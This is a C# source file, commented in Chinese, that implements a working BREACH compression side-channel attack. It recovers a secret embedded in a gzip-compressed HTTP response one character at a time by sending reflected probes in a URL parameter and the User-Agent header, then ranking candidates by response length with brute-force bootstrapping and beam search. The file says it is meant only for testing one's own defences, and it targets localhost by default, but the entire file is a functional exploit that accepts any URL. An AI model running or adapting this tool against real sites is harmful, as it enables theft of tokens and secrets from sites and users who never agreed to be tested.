using System.Net;

// BREACH 攻击 PoC:利用压缩后响应长度作为预言机,逐字符恢复页面中的秘密。
// 仅用于验证自有系统的防护效果。
//
// 用法:
//   BreachAttack --url http://localhost:5080/vulnerable/search --length 32 \
//       --alphabet 0123456789abcdef --expect a3f8c2d9...
// 关键参数:
//   --samples N   每个候选取 N 次平均(对抗随机填充;填充方差越大需要的 N 越大)
//   --known STR   已确认的前缀,跳过前若干字符
//   --concurrency 并发探测数(默认 4)

var opts = Args.Parse(args);
var url = opts.Get("url") ?? "http://localhost:5080/vulnerable/search";
var param = opts.Get("param") ?? "q";
var alphabet = opts.Get("alphabet") ?? "0123456789abcdef";
var known = opts.Get("known") ?? "";
var expect = opts.Get("expect");
var length = int.Parse(opts.Get("length") ?? "32");
var samples = int.Parse(opts.Get("samples") ?? "8");
var concurrency = int.Parse(opts.Get("concurrency") ?? "4");
// LZ77 匹配至少 3 字符,前几个字符无法逐位猜,需穷举引导;
// 实测 3 字符匹配信号太弱(回退引用几乎不省字节),4 字符起步才稳定
var bootstrap = int.Parse(opts.Get("bootstrap") ?? "4");
var bootstrapSamples = int.Parse(opts.Get("bootstrap-samples") ?? "1");
// 束搜索宽度:单位置平局/噪声由多条候选前缀共同推进来吸收
var beamWidth = int.Parse(opts.Get("beam") ?? "3");

var handler = new HttpClientHandler { AutomaticDecompression = DecompressionMethods.None };
var http = new HttpClient(handler);
http.DefaultRequestHeaders.TryAddWithoutValidation("Accept-Encoding", "gzip");

var gate = new SemaphoreSlim(concurrency);

async Task<int> ProbeAsync(string probe)
{
    await gate.WaitAsync();
    try
    {
        // 探测串同时放进 URL 参数和 User-Agent:页面两处反射入口都被利用,
        // 正确候选的 LZ77 匹配次数翻倍,信号随之放大
        using var req = new HttpRequestMessage(HttpMethod.Get,
            url + "?" + param + "=" + Uri.EscapeDataString(probe));
        req.Headers.TryAddWithoutValidation("User-Agent", probe);
        using var resp = await http.SendAsync(req);
        var encoding = resp.Content.Headers.ContentEncoding;
        if (encoding.Count == 0 || !encoding.Contains("gzip"))
            throw new InvalidOperationException("响应未使用 gzip 压缩,长度预言机不存在。");
        var bytes = await resp.Content.ReadAsByteArrayAsync();
        return bytes.Length;
    }
    finally
    {
        gate.Release();
    }
}

// 对齐填充池:剔除字母表内字符,避免与秘密意外匹配
var fillerPool = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!*'"
    .Where(c => !alphabet.Contains(c)).ToArray();

// 预生成一组*固定*的随机对齐串(所有候选共用):
// 重复字符(如 ~~~)会被 LZ77 压成回引,改变不了位对齐;
// 随机串不可压缩,每个对齐串都让 DEFLATE 以不同方式重新解析,
// 而"固定"保证填充对各候选的贡献完全相同,不引入额外方差。
var fillers = new string[Math.Max(samples, bootstrapSamples)];
{
    var rng = new Random(20260714);
    for (var i = 0; i < fillers.Length; i++)
    {
        var chars = new char[i];
        for (var j = 0; j < i; j++)
            chars[j] = fillerPool[rng.Next(fillerPool.Length)];
        fillers[i] = new string(chars);
    }
}

async Task<double> MeasureAsync(string probe, int sampleCount)
{
    // 同一组固定对齐串上取平均:系统性 Huffman 噪声随对齐变化而抵消,
    // 真实匹配信号与对齐无关,得以保留。
    var tasks = Enumerable.Range(0, sampleCount)
        .Select(i => ProbeAsync(probe + fillers[i]))
        .ToArray();
    return (await Task.WhenAll(tasks)).Average();
}

// 对 known 的下一个字符,返回 (候选字符, 平均长度) 按长度升序
async Task<List<(char C, double Len)>> RankAsync(string prefix)
{
    var tasks = alphabet.Select(async c => (c, await MeasureAsync(prefix + c, samples))).ToArray();
    var results = await Task.WhenAll(tasks);
    return results.OrderBy(r => r.Item2).Select(r => (r.c, r.Item2)).ToList();
}

Console.WriteLine($"目标: {url}  参数: {param}  样本/候选: {samples}");
var sw = System.Diagnostics.Stopwatch.StartNew();

if (known.Length < bootstrap && length >= bootstrap)
{
    var combos = 1;
    for (var i = 0; i < bootstrap; i++) combos *= alphabet.Length;
    Console.WriteLine($"穷举引导前缀({bootstrap} 字符, {combos} 种组合)...");
    var tasks = Enumerable.Range(0, combos).Select(async n =>
    {
        var chars = new char[bootstrap];
        for (var i = bootstrap - 1; i >= 0; i--) { chars[i] = alphabet[n % alphabet.Length]; n /= alphabet.Length; }
        var probe = new string(chars);
        return (probe, await MeasureAsync(probe, bootstrapSamples));
    }).ToArray();
    var ranked = (await Task.WhenAll(tasks)).OrderBy(r => r.Item2).ToList();
    known = ranked[0].probe;
    Console.WriteLine($"引导前缀: {known}  (top3: {string.Join("  ", ranked.Take(3).Select(r => $"{r.probe}:{r.Item2:F1}"))})");
    if (expect != null && !expect.StartsWith(known, StringComparison.Ordinal))
    {
        Console.WriteLine("!! 引导前缀与预期秘密不符,恢复失败(防护可能已生效)");
        Environment.Exit(2);
    }
}

// 束搜索,按"相对兄弟的累计赤字"评分:
// 绝对长度受各分支基线影响不可比,但同一父前缀下各候选共享基线,
// 候选长度与最优兄弟之差(赤字)只反映匹配信号。正确路径每步赤字≈0。
var beam = new List<(string Prefix, double Score)> { (known, 0.0) };
for (var pos = known.Length; pos < length; pos++)
{
    var all = new List<(string Prefix, double Score, double Len)>();
    foreach (var (prefix, score) in beam)
    {
        var ranked = await RankAsync(prefix);
        var bestLen = ranked[0].Len;
        foreach (var r in ranked)
            all.Add((prefix + r.C, score + (r.Len - bestLen), r.Len));
    }

    beam = all.OrderBy(x => x.Score).Take(beamWidth).Select(x => (x.Prefix, x.Score)).ToList();
    var top = all.OrderBy(x => x.Score).Take(3).ToList();
    Console.WriteLine($"[{pos + 1,2}/{length}] {beam[0].Prefix}   (top3: {string.Join("  ", top.Select(t => $"…{t.Prefix[Math.Max(0, t.Prefix.Length - 6)..]}:赤字{t.Score:F2}"))})");

    if (expect != null && !beam.Any(b => expect.StartsWith(b.Prefix, StringComparison.Ordinal)))
    {
        Console.WriteLine($"!! 所有候选前缀均与预期秘密偏离,恢复失败(防护可能已生效)。当前最优: {beam[0].Prefix}");
        Environment.Exit(2);
    }
}
known = beam[0].Prefix;

sw.Stop();
Console.WriteLine($"完成,耗时 {sw.Elapsed.TotalSeconds:F1}s,恢复值: {known}");
if (expect != null)
{
    var ok = string.Equals(known, expect, StringComparison.Ordinal);
    Console.WriteLine(ok ? "== 攻击成功:秘密被完整恢复 ==" : "== 攻击失败:恢复值与秘密不符 ==");
    Environment.Exit(ok ? 0 : 2);
}

static class Args
{
    public static Dictionary<string, string> Parse(string[] args)
    {
        var d = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
        for (var i = 0; i + 1 < args.Length; i += 2)
            if (args[i].StartsWith("--"))
                d[args[i][2..]] = args[i + 1];
        return d;
    }
}

file static class DictExt
{
    public static string? Get(this Dictionary<string, string> d, string key) =>
        d.TryGetValue(key, out var v) ? v : null;
}
